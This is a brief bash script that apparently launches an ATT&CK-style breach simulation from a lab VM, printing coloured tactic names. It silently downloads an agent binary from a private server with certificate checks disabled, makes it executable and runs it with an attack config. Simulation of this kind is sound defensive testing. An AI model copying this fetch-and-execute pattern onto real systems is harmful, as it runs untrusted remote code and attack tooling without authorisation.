#!/bin/bash
## colors
NC='\e[0;00m' # no colour
GREEN='\e[0;32m' # green
ORANGE='\e[0;33m' # orange
CYAN='\e[0;36m' # cyan
BLUE='\u001B[94m' # blueBright
LBLUE='\033[0;34m' # light blue
WHITE='\033[0;37m' # white
function corange {
	local STRING=${1}
	printf "${ORANGE}${STRING}${NC}"
}
function cgreen {
	local STRING=${1}
	printf "${GREEN}${STRING}${NC}"
}
function ccyan {
	local STRING=${1}
	printf "${CYAN}${STRING}${NC}"
}
function cblue {
	local STRING=${1}
	printf "${BLUE}${STRING}${NC}"
}
function cwhite {
	local STRING=${1}
	printf "${WHITE}${STRING}${NC}"
}

echo "Initializing attack simulation -- from [ $(cblue 'att&ck-vm') ]"
rm monkey-linux-64* 2&>/dev/null
wget --no-check-certificate https://172.20.21.5:5000/api/monkey/download/monkey-linux-64 2&>/dev/null; chmod +x monkey-linux-64;
sleep 1
echo "Sending exploit telemetry - $(cwhite 'Login Creds')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Execution')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Defense evasion')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Credentials access')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Discovery')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Lateral movement')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Collection')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Command and control')"
sleep 1
echo "Initiating ATT&CK exploit - $(cwhite 'Exfiltration')"
sleep 1
echo "$(cwhite 'ATT&CK simulation') in progress ..."
./monkey-linux-64 m0nk3y -s 172.20.21.5:5000 -c ./attack.conf 2&>/dev/null
